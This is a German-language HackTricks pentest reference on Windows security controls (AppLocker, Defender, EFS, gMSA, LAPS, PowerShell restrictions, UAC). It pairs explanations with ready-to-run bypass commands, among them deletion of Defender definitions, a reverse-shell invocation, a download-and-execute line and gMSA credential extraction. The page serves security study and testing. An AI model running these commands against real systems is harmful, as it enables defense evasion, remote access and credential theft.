# Windows-Sicherheitskontrollen

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Policy

Eine Application Whitelist ist eine Liste genehmigter Softwareanwendungen oder ausführbarer Dateien, deren Vorhandensein und Ausführung auf einem System erlaubt ist. Ziel ist es, die Umgebung vor schädlicher Malware und nicht genehmigter Software zu schützen, die nicht den spezifischen geschäftlichen Anforderungen einer Organisation entspricht.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ist Microsofts **Application-Whitelisting-Lösung** und ermöglicht Systemadministratoren die Kontrolle darüber, **welche Anwendungen und Dateien Benutzer ausführen können**. Sie bietet **granulare Kontrolle** über ausführbare Dateien, Skripte, Windows-Installer-Dateien, DLLs, paketierte Apps und Installationsprogramme für paketierte Apps.\
In Organisationen ist es üblich, **cmd.exe und PowerShell.exe** sowie den Schreibzugriff auf bestimmte Verzeichnisse zu **blockieren**, **aber all dies kann umgangen werden**.

### Überprüfung

Prüfe, welche Dateien/Erweiterungen auf der Blacklist/Whitelist stehen:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Dieser Registrierungspfad enthält die von AppLocker angewendeten Konfigurationen und Richtlinien und bietet eine Möglichkeit, die derzeit auf dem System durchgesetzten Regeln zu überprüfen:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nützliche **beschreibbare Ordner**, um die AppLocker Policy zu umgehen: Wenn AppLocker die Ausführung beliebiger Dateien innerhalb von `C:\Windows\System32` oder `C:\Windows` erlaubt, gibt es **beschreibbare Ordner**, die du verwenden kannst, um **diese zu umgehen**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Häufig **vertrauenswürdige** [**"LOLBAS's"**](https://lolbas-project.github.io/) Binaries können ebenfalls nützlich sein, um AppLocker zu umgehen.
- **Schlecht geschriebene Regeln können ebenfalls umgangen werden**
- Zum Beispiel **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**: Du kannst überall einen **Ordner namens `allowed`** erstellen, und er wird zugelassen.
- Organisationen konzentrieren sich oft auch darauf, die ausführbare Datei **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** zu **blockieren**, vergessen aber die **anderen** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) wie `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` oder `PowerShell_ISE.exe`.
- **DLL enforcement** ist aufgrund der zusätzlichen Belastung, die dadurch auf ein System ausgeübt werden kann, und des erforderlichen Testaufwands, um sicherzustellen, dass nichts beschädigt wird, nur sehr selten aktiviert. Daher hilft die Verwendung von **DLLs als Backdoors dabei, AppLocker zu umgehen**.
- Du kannst [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell**-Code in jedem Prozess auszuführen und AppLocker zu umgehen. Weitere Informationen findest du unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Lokale Credentials befinden sich in dieser Datei, die Passwörter sind gehasht.

### Local Security Authority (LSA) - LSASS

Die **Credentials** (gehasht) werden aus Gründen des Single Sign-On im **Speicher** dieses Subsystems **gespeichert**.\
**LSA** verwaltet die lokale **Security Policy** (Passwortrichtlinie, Benutzerberechtigungen ...), **Authentication**, **Access Tokens** ...\
LSA überprüft die bereitgestellten Credentials in der **SAM**-Datei (bei einer lokalen Anmeldung) und **kommuniziert** mit dem **Domain Controller**, um einen Domain-Benutzer zu authentifizieren.

Die **Credentials** werden im **Prozess LSASS** **gespeichert**: Kerberos-Tickets, NT- und LM-Hashes, leicht entschlüsselbare Passwörter.

### LSA secrets

LSA kann einige Credentials auf der Festplatte speichern:

- Passwort des Computerkontos von Active Directory (nicht erreichbarer Domain Controller).
- Passwörter der Konten von Windows-Diensten
- Passwörter für geplante Tasks
- Mehr (Passwort von IIS-Anwendungen ...)

### NTDS.dit

Dies ist die Datenbank von Active Directory. Sie ist nur auf Domain Controllern vorhanden.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ist ein Antivirus, der in Windows 10 und Windows 11 sowie in Versionen von Windows Server verfügbar ist. Er **blockiert** gängige pentesting Tools wie **`WinPEAS`**. Es gibt jedoch Möglichkeiten, diese **Schutzmaßnahmen zu umgehen**.

### Check

Um den **Status** von **Defender** zu überprüfen, kannst du das PS-Cmdlet **`Get-MpComputerStatus`** ausführen (überprüfe den Wert von **`RealTimeProtectionEnabled`**, um festzustellen, ob es aktiv ist):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Um es zu enumerieren, kannst du auch Folgendes ausführen:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS schützt Dateien durch Verschlüsselung und verwendet dabei einen **symmetrischen Schlüssel**, der als **File Encryption Key (FEK)** bezeichnet wird. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und im **alternativen Datenstrom** $EFS der verschlüsselten Datei gespeichert. Wenn eine Entschlüsselung erforderlich ist, wird der entsprechende **private Schlüssel** des digitalen Zertifikats des Benutzers verwendet, um den FEK aus dem $EFS-Datenstrom zu entschlüsseln. Weitere Informationen finden sich [hier](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Entschlüsselungsszenarien ohne Benutzerinitiierung** umfassen:

- Wenn Dateien oder Ordner in ein Nicht-EFS-Dateisystem wie [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) verschoben werden, werden sie automatisch entschlüsselt.
- Verschlüsselte Dateien, die über das Netzwerk mit dem SMB/CIFS-Protokoll gesendet werden, werden vor der Übertragung entschlüsselt.

Diese Verschlüsselungsmethode ermöglicht dem Besitzer einen **transparenten Zugriff** auf verschlüsselte Dateien. Das einfache Ändern des Passworts des Besitzers und anschließende Anmelden ermöglicht jedoch keine Entschlüsselung.

**Wichtige Erkenntnisse**:

- EFS verwendet einen symmetrischen FEK, der mit dem öffentlichen Schlüssel des Benutzers verschlüsselt wird.
- Für die Entschlüsselung wird der private Schlüssel des Benutzers verwendet, um auf den FEK zuzugreifen.
- Unter bestimmten Bedingungen, beispielsweise beim Kopieren nach FAT32 oder bei der Netzwerkübertragung, erfolgt eine automatische Entschlüsselung.
- Verschlüsselte Dateien sind für den Besitzer ohne zusätzliche Schritte zugänglich.

### EFS-Informationen prüfen

Prüfe, ob ein **Benutzer** diesen **Dienst verwendet hat**, indem du überprüfst, ob dieser Pfad existiert:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Prüfe mit cipher /c \<file>\, **wer** **Zugriff** auf die Datei hat.  
Du kannst außerdem `cipher /e` und `cipher /d` innerhalb eines Ordners verwenden, um alle Dateien zu **verschlüsseln** bzw. zu **entschlüsseln**.

### EFS-Dateien entschlüsseln

#### Als Authority System

Diese Methode erfordert, dass der **Opferbenutzer** einen **Prozess** auf dem Host **ausführt**. Wenn dies der Fall ist, kannst du mit einer `meterpreter`-Sitzung das Token des Prozesses des Benutzers imitieren (`impersonate_token` aus `incognito`). Alternativ kannst du einfach per `migrate` in den Prozess des Benutzers wechseln.

#### Das Passwort des Benutzers kennen

Mimikatz dokumentiert, wie das Zertifikat bzw. private Schlüsselmaterial des Benutzers importiert und EFS-geschützte Dateien entschlüsselt werden, wenn das Passwort bekannt ist.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft entwickelte **Group Managed Service Accounts (gMSA)**, um die Verwaltung von Service Accounts in IT-Infrastrukturen zu vereinfachen. Im Gegensatz zu herkömmlichen Service Accounts, bei denen häufig die Einstellung "**Password never expire**" aktiviert ist, bieten gMSAs eine sicherere und besser verwaltbare Lösung:

- **Automatische Passwortverwaltung**: gMSAs verwenden ein komplexes, 240 Zeichen langes Passwort, das sich automatisch entsprechend der Domain- oder Computerrichtlinie ändert. Dieser Prozess wird vom Microsoft Key Distribution Service (KDC) verwaltet, wodurch manuelle Passwortaktualisierungen entfallen.
- **Erhöhte Sicherheit**: Diese Accounts sind gegen Lockouts geschützt und können nicht für interaktive Anmeldungen verwendet werden, was ihre Sicherheit erhöht.
- **Unterstützung mehrerer Hosts**: gMSAs können auf mehreren Hosts verwendet werden und eignen sich daher ideal für Services, die auf mehreren Servern ausgeführt werden.
- **Unterstützung geplanter Tasks**: Im Gegensatz zu Managed Service Accounts unterstützen gMSAs die Ausführung geplanter Tasks.
- **Vereinfachte SPN-Verwaltung**: Das System aktualisiert den Service Principal Name (SPN) automatisch, wenn sich die sAMaccount-Details oder der DNS-Name des Computers ändern, wodurch die SPN-Verwaltung vereinfacht wird.

Die Passwörter von gMSAs werden in der LDAP-Eigenschaft _**msDS-ManagedPassword**_ gespeichert und von Domain Controllern (DCs) automatisch alle 30 Tage zurückgesetzt. Dieses Passwort, ein verschlüsselter Daten-Blob namens [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kann nur von autorisierten Administratoren und den Servern abgerufen werden, auf denen die gMSAs installiert sind, wodurch eine sichere Umgebung gewährleistet wird. Für den Zugriff auf diese Informationen ist eine gesicherte Verbindung wie LDAPS erforderlich, oder die Verbindung muss mit „Sealing & Secure“ authentifiziert werden.

![Relaying NTLM authentication to retrieve a gMSA password](../../images/asd1.png)<sup>[[1]](#references)</sup>

Du kannst dieses Passwort mit [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup> auslesen.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Weitere Informationen finden Sie in der archivierten ursprünglichen Recherche**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Dieselbe Recherche erklärt, wie ein **NTLM relay attack** ein **gMSA password** erlangen kann, wenn der relayed principal zum Lesen von `msDS-ManagedPassword` berechtigt ist.<sup>[[1]](#references)</sup>

### Ausnutzen von ACL chaining zum Lesen des verwalteten gMSA-Passworts (GenericAll -> ReadGMSAPassword)

In vielen Umgebungen können Benutzer mit niedrigen Berechtigungen ohne DC compromise auf gMSA secrets zugreifen, indem sie falsch konfigurierte object ACLs ausnutzen:<sup>[[3]](#references)</sup>

- Einer von Ihnen kontrollierten Gruppe (z. B. über GenericAll/GenericWrite) wird `ReadGMSAPassword` für einen gMSA gewährt.
- Indem Sie sich selbst zu dieser Gruppe hinzufügen, erben Sie das Recht, den `msDS-ManagedPassword`-Blob des gMSA über LDAP zu lesen und nutzbare NTLM credentials abzuleiten.

Typischer Ablauf:

1) Ermitteln Sie den Pfad mit BloodHound und markieren Sie Ihre foothold principals als Owned. Suchen Sie nach Kanten wie:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Fügen Sie sich selbst zur kontrollierten intermediate group hinzu (Beispiel mit bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Das von gMSA verwaltete Passwort über LDAP lesen und den NTLM-Hash ableiten. NetExec automatisiert die Extraktion von `msDS-ManagedPassword` und die Umwandlung in NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Authentifiziere dich als gMSA mithilfe des NTLM-Hashes (kein Klartext erforderlich). Wenn sich das Konto in Remote Management Users befindet, funktioniert WinRM direkt:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notizen:
- LDAP-Lesezugriffe auf `msDS-ManagedPassword` erfordern Sealing (z. B. LDAPS/Sign+Seal). Tools erledigen dies automatisch.
- gMSAs werden häufig lokale Rechte wie WinRM gewährt. Überprüfe die Gruppenmitgliedschaft (z. B. Remote Management Users), um laterale Bewegungen zu planen.
- Wenn du den Blob nur benötigst, um den NTLM-Hash selbst zu berechnen, siehe die Struktur MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

Die **Local Administrator Password Solution (LAPS)**, die bei [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) zum Download verfügbar ist, ermöglicht die Verwaltung lokaler Administratorpasswörter. Diese Passwörter, die **zufällig generiert**, eindeutig und **regelmäßig geändert** werden, werden zentral im Active Directory gespeichert. Der Zugriff auf diese Passwörter wird über ACLs auf autorisierte Benutzer beschränkt. Bei ausreichenden Berechtigungen wird das Lesen lokaler Adminpasswörter ermöglicht.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **schränkt viele der für eine effektive Verwendung von PowerShell erforderlichen Funktionen ein**, z. B. durch das Blockieren von COM-Objekten, die ausschließliche Zulassung genehmigter .NET-Typen, XAML-basierter Workflows, PowerShell-Klassen und mehr.

### **Prüfen**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
In aktuellen Windows-Versionen funktioniert dieser Bypass nicht mehr, aber du kannst [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) verwenden.\
**Zum Kompilieren benötigst du möglicherweise** **dazu** _**Eine Referenz hinzufügen**_ -> _Durchsuchen_ ->_Durchsuchen_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` hinzufügen und **das Projekt auf .Net4.5 ändern**.

#### Direkter Bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Du kannst [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell**-Code in jedem Prozess **auszuführen** und den constrained mode zu umgehen. Weitere Informationen findest du unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS-Ausführungsrichtlinie

Standardmäßig ist sie auf **restricted** gesetzt. Die wichtigsten Möglichkeiten, diese Richtlinie zu umgehen:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Mehr dazu ist [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup> zu finden.

## Security Support Provider Interface (SSPI)

Ist die API, die zur Authentifizierung von Benutzern verwendet werden kann.

SSPI wählt ein geeignetes Authentifizierungsprotokoll für zwei miteinander kommunizierende Computer aus und bevorzugt Kerberos, sofern verfügbar. Diese Protokolle werden von Security Support Providern (SSPs) implementiert, die unter Windows als DLLs installiert sind. Beide Kommunikationspartner müssen den ausgehandelten Provider unterstützen.

### Wichtigste SSPs

- **Kerberos**: Der bevorzugte
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** und **NTLMv2**: Aus Kompatibilitätsgründen
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webserver und LDAP, Passwort in Form eines MD5-Hashs
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL und TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Wird verwendet, um das zu verwendende Protokoll auszuhandeln (Kerberos oder NTLM, wobei Kerberos das Standardprotokoll ist)
- %windir%\Windows\System32\lsasrv.dll

#### Die Aushandlung kann mehrere Methoden oder nur eine anbieten.

## UAC - Benutzerkontensteuerung

[Benutzerkontensteuerung (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsabfrage für Aktivitäten mit erhöhten Rechten** ermöglicht.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA über Rechteverkettung zu WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Umgehen von AppLocker und dem eingeschränkten PowerShell-Sprachmodus](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 Möglichkeiten zum Umgehen der PowerShell-Ausführungsrichtlinie](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ EFS-Dateien entschlüsseln](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
{{#include ../../banners/hacktricks-training.md}}
